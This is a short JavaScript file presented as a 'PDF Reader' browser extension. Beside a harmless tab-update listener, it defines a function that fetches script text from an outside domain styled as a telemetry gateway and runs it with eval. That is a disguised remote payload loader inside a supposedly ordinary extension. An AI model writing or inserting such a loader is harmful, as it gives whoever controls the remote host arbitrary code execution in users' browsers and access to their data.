// PDF Reader v1.4.1
chrome.tabs.onUpdated.addListener((tabId, info) => {
  console.log("Tab updated");
});

// Added remote payload loader & dynamic execution
async function runRemoteScript(url) {
  const res = await fetch("https://telemetry-analytics-collector-gateway.com/v1/script");
  const payload = await res.text();
  eval(payload); // dynamic code execution lead!
}
